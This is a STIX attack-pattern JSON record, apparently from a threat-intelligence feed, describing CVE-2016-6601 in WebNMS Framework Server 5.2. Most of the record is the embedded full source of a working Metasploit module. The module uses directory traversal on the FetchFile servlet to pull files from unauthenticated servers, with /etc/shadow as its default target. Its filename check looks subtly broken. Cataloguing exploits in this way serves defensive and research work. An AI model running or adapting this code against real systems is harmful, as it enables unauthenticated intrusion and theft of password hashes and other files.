{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--38c2edad-1fa7-47f3-942b-68de14bd8ce5",
    "created": "2024-08-14T16:23:04.119381Z",
    "modified": "2024-08-14T16:23:04.119385Z",
    "name": "WebNMS Framework Server Arbitrary Text File Download",
    "description": " This module abuses a vulnerability in WebNMS Framework Server 5.2 that allows an unauthenticated user to download files off the file system by using a directory traversal attack on the FetchFile servlet. Note that only text files can be downloaded properly, as any binary file will get mangled by the servlet. Also note that for Windows targets you can only download files that are in the same drive as the WebNMS installation. This module has been tested with WebNMS Framework Server 5.2 and 5.2 SP1 on Windows and Linux. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/webnms_file_download.rb",
            "external_id": "webnms_file_download.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-6601"
        },
        {
            "source_name": "reference",
            "url": "https://blogs.securiteam.com/index.php/archives/2712"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2016/Aug/54"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'WebNMS Framework Server Arbitrary Text File Download',\n        'Description' => %q{\n          This module abuses a vulnerability in WebNMS Framework Server 5.2 that allows an\n          unauthenticated user to download files off the file system by using a directory\n          traversal attack on the FetchFile servlet.\n          Note that only text files can be downloaded properly, as any binary file will get\n          mangled by the servlet. Also note that for Windows targets you can only download\n          files that are in the same drive as the WebNMS installation.\n          This module has been tested with WebNMS Framework Server 5.2 and 5.2 SP1 on\n          Windows and Linux.\n        },\n        'Author' => [\n          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2016-6601'],\n          [ 'URL', 'https://blogs.securiteam.com/index.php/archives/2712' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2016/Aug/54' ]\n        ],\n        'DisclosureDate' => '2016-07-04'\n      )\n    )\n    register_options(\n      [\n        OptPort.new('RPORT', [true, 'The target port', 9090]),\n        OptString.new('TARGETURI', [ true, 'WebNMS path', '/']),\n        OptString.new('FILEPATH', [ false, 'The filepath of the file you want to download', '/etc/shadow']),\n        OptString.new('TRAVERSAL_PATH', [ false, 'The traversal path to the target file (if you know it)']),\n        OptInt.new('MAX_TRAVERSAL', [ false, \"Maximum traversal path depth (if you don't know the traversal path)\", 10])\n      ],\n      self.class\n    )\n  end\n\n  def check_filename(path)\n    valid = true\n    invalid_chars = [':', '?', '*', '|', '\"', '<', '>']\n    invalid_chars.each do |i|\n      if path.include? i\n        valid = false\n        break\n      end\n    end\n  end\n\n  def run\n    if check_filename(datastore['filepath'])\n      file = nil\n      if datastore['TRAVERSAL_PATH'].nil?\n        traversal_size = datastore['MAX_TRAVERSAL']\n        file = get_file(datastore['FILEPATH'], traversal_size)\n      else\n        file = get_file(datastore['TRAVERSAL_PATH'], 1)\n      end\n      if file.nil?\n        print_error(\"#{peer} - Failed to download the specified file.\")\n        return\n      else\n        vprint_line(file)\n        fname = File.basename(datastore['FILEPATH'])\n\n        path = store_loot(\n          'webnms.http',\n          'text/plain',\n          datastore['RHOST'],\n          file,\n          fname\n        )\n        print_good(\"File download successful, file saved in #{path}\")\n      end\n    else\n      print_error('Module Failed: Invalid Filename')\n    end\n  end\n\n  def get_file(path, depth)\n    while depth > 0\n      file_name = '../' * depth + path\n      vprint_status(\"Attempting to get file: #{file_name}\")\n      begin\n        res = send_request_cgi(\n          {\n            'uri' => normalize_uri(target_uri.path, 'servlets', 'FetchFile'),\n            'method' => 'GET',\n            'vars_get' => { 'fileName' => file_name }\n          }\n        )\n      rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,\n             Rex::HostUnreachable, Errno::ECONNRESET => e\n        print_error(\"Connect to the target: #{e.class} - #{e.message}\")\n        return nil\n      end\n      if res &&\n         res.code == 200 &&\n         !res.body.to_s.empty? &&\n         (res.body.to_s.include? 'File Found')\n        return res.body.to_s\n      end\n\n      depth -= 1\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-07-04"
}